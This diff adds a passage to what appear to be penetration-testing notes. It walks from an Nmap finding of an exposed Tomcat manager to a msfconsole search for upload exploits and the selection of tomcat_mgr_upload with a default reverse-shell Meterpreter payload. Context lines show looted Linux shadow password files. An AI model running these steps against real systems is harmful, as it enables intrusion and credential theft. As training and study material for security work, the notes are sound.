@@ -375,3 +375,52 @@ host            service  type          name                   content     info  
 172.16.194.172           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.shadow_492948.txt
 
 ```
+### **Searching for Exploits**
+
+- After Nmap scans. As an exmple below, we have identified Tomcat version on port 1234
+
+```
+1234/tcp open  http    syn-ack ttl 61 Apache Tomcat/Coyote JSP engine 1.1
+| http-enum: 
+|   /examples/: Sample scripts
+|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
+|   /manager/html: Apache Tomcat (401 Unauthorized)
+|_  /docs/: Potentially interesting folder
+
+````
+- Search Tomcat exploit in msfconsole 
+
+```
+msf6 > search tomcat upload
+
+Matching Modules
+================
+
+   #  Name                                                         Disclosure Date  Rank       Check  Description
+   -  ----                                                         ---------------  ----       -----  -----------
+   0  auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
+   1  auxiliary/admin/http/tomcat_ghostcat                         2020-02-20       normal     Yes    Apache Tomcat AJP File Read
+   2  exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
+   3  exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
+   4  exploit/multi/http/cisco_dcnm_upload_2019                    2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
+   5  exploit/linux/http/cisco_hyperflex_file_upload_rce           2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)
+   6  exploit/linux/http/cpi_tararchive_upload                     2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
+   7  exploit/linux/http/cisco_prime_inf_rce                       2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
+   8  exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
+   9  exploit/multi/http/tomcat_jsp_upload_bypass                  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
+
+
+Interact with a module by name or index. For example info 9, use 9 or use exploit/multi/http/tomcat_jsp_upload_bypass
+
+msf6 > 
+```
+
+- Select module 3
+
+```
+msf6 > use 3
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp                                                                                
+msf6 exploit(multi/http/tomcat_mgr_upload) > 
+```
+
+
